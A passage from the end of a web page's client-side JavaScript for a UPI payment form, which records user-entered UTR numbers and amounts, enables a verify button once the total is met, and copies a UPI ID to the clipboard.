                    verifyButton.classList.add("bg-gradient-to-r", "from-blue-600", "to-indigo-600", "text-white", "hover:from-blue-700", "hover:to-indigo-700");
                    verifyPaymentButton.removeAttribute("disabled");
                    paymentCompleteMessage.style.display = "block";
                    console.log("✅ Payment completed, verify button enabled.");
                } else {
                    verifyButton.disabled = true;
                    verifyButton.classList.add("bg-gray-300", "text-gray-500", "cursor-not-allowed");
                    verifyButton.classList.remove("bg-gradient-to-r", "from-blue-600", "to-indigo-600", "text-white", "hover:from-blue-700", "hover:to-indigo-700");
                    console.log("❌ Button Disabled!");
                    verifyPaymentButton.setAttribute("disabled", "true");
                    paymentCompleteMessage.style.display = "none";
                    console.log("❌ Payment incomplete, verify button disabled.");
                }
            }

            addPaymentButton.addEventListener("click", function() {
                const utrValue = utrInput.value.trim();
                const amountValue = parseInt(amountInput.value);

                console.log("User Input - UTR:", utrValue);
                console.log("User Input - Amount:", amountValue);

                if (!utrValue || utrValue.length !== 12 || isNaN(amountValue) || amountValue <= 0 || amountValue > 2000) {
                    alert("Please enter a valid 12-digit UTR number and an amount up to ₹2000.");
                    console.log("Invalid input detected.");
                    return;
                }

                if (totalPaid + amountValue > finalPaidPrice) {
                    alert("Payment exceeds the total required amount!");
                    console.log("Payment rejected: Exceeds final amount.");
                    return;
                }

                if (!paymentItemContainer) {
                    console.error("Error: .payment-item-container is missing!");
                    return;
                }

                const paymentEntry = document.createElement("div");
                paymentEntry.classList.add("payment-item", "flex", "justify-between", "p-3", "bg-gray-100", "rounded", "mt-2");

                paymentEntry.innerHTML = `
                            <div>
                                <div class="text-xs font-medium">UTR: ${utrValue}</div>
                                <div class="text-xs text-gray-500">Amount: ₹${amountValue}</div>
                            </div>
                            <button class="text-red-500 hover:text-red-700 text-xs delete-payment">
                                <i class="fas fa-times-circle"></i>
                            </button>
                            `;

                console.log("Adding payment entry to list:", paymentEntry);
                paymentItemContainer.appendChild(paymentEntry);

                totalPaid += amountValue;
                console.log("Total Paid after addition:", totalPaid);

                utrInput.value = "";
                amountInput.value = "";
                updateUI();

                paymentEntry.querySelector(".delete-payment").addEventListener("click", function() {
                    totalPaid -= amountValue;
                    paymentEntry.remove();
                    console.log("Payment removed, new total paid:", totalPaid);
                    updateUI();
                });
            });

            verifyPaymentButton.addEventListener("click", function() {
                if (totalPaid >= finalPaidPrice) {
                    overlay.classList.toggle("show");
                    popup.classList.toggle("show");
                } else {
                    console.log("❌ Verification failed: Payment not completed.");
                }
            });

            cancelButton.addEventListener("click", function() {
                overlay.classList.remove("show");
                popup.classList.remove("show");
            });

            updateUI();
        });
    </script>




    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const copyButtons = document.querySelectorAll(".copy-button");

            copyButtons.forEach(button => {
                button.addEventListener("click", function() {
                    const upiText = this.closest(".upi-id-container").querySelector(".upi-text"); // Get UPI text in the same container

                    if (!upiText) {
                        console.error("UPI text not found for this button!");
                        return;
                    }

                    const upiID = upiText.textContent.trim(); // Get UPI ID

                    // Copy to clipboard
                    navigator.clipboard.writeText(upiID).then(() => {
                        // Change button style after successful copy
                        button.innerHTML = `<span class="text-green-600 text-xs font-medium px-1">Copied!</span>`;
                        button.classList.remove("bg-gray-50");
                        button.classList.add("bg-green-50");

                        console.log("UPI ID copied:", upiID);
                    }).catch(err => {
                        console.error("Failed to copy UPI ID:", err);
                    });
                });
            });
        });
    </script>




</body></html>